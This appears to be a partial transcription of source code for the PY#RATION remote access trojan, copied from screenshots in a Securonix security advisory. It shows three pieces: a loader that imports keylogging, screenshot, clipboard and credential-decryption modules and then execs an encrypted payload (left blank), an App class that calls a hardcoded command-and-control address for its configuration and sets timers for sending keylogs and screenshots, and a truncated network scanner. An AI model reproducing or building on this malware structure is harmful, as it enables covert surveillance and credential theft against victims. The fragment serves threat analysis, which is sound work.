# Source: 
# https://www.securonix.com/blog/security-advisory-python-based-pyration-attack-campaign/

# from the main.py image:
from __future__ import annotations
from cryptography.fernet import Fernet
import base64, subprocess, socketio, struct, socket
from enum import Enum
import requests
from time import sleep
from PIL import ImageGrab
import ctypes as ct
from base64 import b64decode
from configparser import ConfigParser
from typing import Optional, Iterator, Any 
from random import randint
from datetime import datetime, timedelta
from pynput.keyboard import Listener
import platform, os, re, sys, json, base64, sqlite3
if os.name == 'nt':
    import win32crypt, pythoncom
    pythoncom.CoInitialize()
    from windows_tools import antivirus
    try:
        installed_antivirus = antivirus.get_installed_antivirus_software()
    except Exception as e:
        try:
            installed_antivirus = None
        finally:
            e = None
            del e

    else:
        if not installed_antivirus:
            installed_antivirus = []
from Cryptodome.Cipher import AES
import shutil
from getmac import get_mac_address as gma
import pyperclip
code_plain = b'' # Encrypted malicious code goes here
fernet_encryption = Fernet(b'') #Key goes here
decrypted_message = fernet_encryption.decrypt(code_plain)
exec(decrypted_message)

#############################################################

# from app class image:
class App:
    VERSION = '1.6.0'
    BASE_URL = 'http://169.239.129.108:5555'
    KEYLOG_SECONDS_TO_SEND = 60
    KEYLOG_SECONDS_TO_LOOP_SLEEP = 60
    SC_SHOTS_SENDING_IN_SECONDS = 60 * 10
    SIO_INSTANCE = None
    KEYLOG_BUFFER_SIZE = 603366 # like website :)
    IDENTITY = get_unique_identity()
    IN_NETWORK_SCAN = False

    @classmethod
    def get_config_from_server(cls):
        ###
        #   Get client config from server
        ###
        try:
            res = requests.get(f'{cls.BASE_URL}/client/config', headers={'identity': App.IDENTITY})
        except Exception as e:  # for network errors or SSL
            return
        if res.status_code != 200:
            return
        res_json = res.json()
        cls.update(data=res_json)

#############################################################

#from NetworkScanner class image:
class NetworkScanner:
    DEFAULT_PORT_MIN = 1
    DEFAULT_PORT_MAX = 6000
    IP_BATCH = 5
    PORT_BATCH = 10
    BATCH_SLEEP_TIME = 0.3

    def __init__(self, ip: str, ports_range: str):
        ###
        # ip could be specific ip or 10.0.0.0 for the whole network.
        # port_range should be in this format -> "1-1000"
        ###
        self.ip = ip
        self.PORT_MIN, self.PORT_MAX = self.get_port_range(range_=ports_range)
        self.is_specific_host_scan = bool(ip) and ip.split('.')[-1] != "0"
        self.network_status = {
            "network": ip if self.is_specific_host_scan else self.network + "0",
            "hosts": {}
        }
        print(self.ip)

    def get_port_range(self, range_: str) -> tuple:
        try:
            _min, _max = range_.split("-")
            _min, _max = int(_min.strip()), int(_max.strip())

        except:
            return self.DEFAULT_PORT_MIN, self.DEFAULT_PORT_MAX

        else:
            _min = _min if self.DEFAULT_PORT_MIN <= _min < self.DEFAULT_PORT_MAX else self.DEFAULT_PORT_MIN
            _max = _max if self.DEFAULT_PORT_MIN < _max <= self.DEFAULT_PORT_MAX else self.DEFAULT_PORT_MAX
            return _min, _max

    @property
    def network(self) -> str:
        return ".".join(self.ip.split(".")[:-1]) + "."

    def scan_the_network(self):
    # IMAGE ENDS HERE #

#############################################################
